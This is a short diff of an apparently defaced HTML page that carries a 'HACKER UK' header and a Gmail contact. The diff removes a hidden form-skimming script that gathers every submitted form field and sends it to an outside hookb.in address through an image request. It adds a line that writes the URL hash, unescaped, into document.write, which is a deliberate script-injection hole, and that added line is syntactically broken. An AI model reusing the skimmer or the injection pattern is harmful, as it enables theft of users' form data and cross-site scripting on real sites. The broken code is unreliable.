@@ -61,18 +61,8 @@ HACKER<br><br>UK.<br><br>Gmail: <a href="mail:haomhoa@gmail.com">haomhoa@gmail.c
 </script>
 	
 	<script>
-	! function() {
-    document.querySelectorAll("form").forEach(function(a) {
-        a.addEventListener("submit", function(a) {
-            var b;
-            if (!a.target) return null;
-            b = new FormData(a.target);
-            var d = "";
-            for (var e of b.entries()) d = d + "&" + e[0] + "=" + e[1];
-            return (new Image).src = "https://hookb.in/BY01pMnQWaSkN6yyNdkP/?" + d.substring(1), !0
-        })
-    })
-}();
+		var input = location.hash.slice(1);
+		document.write("<scr"+ipt>var foo = "+ input +"; "<scr"+ipt>");
 	</script>
 </body>
 </html>
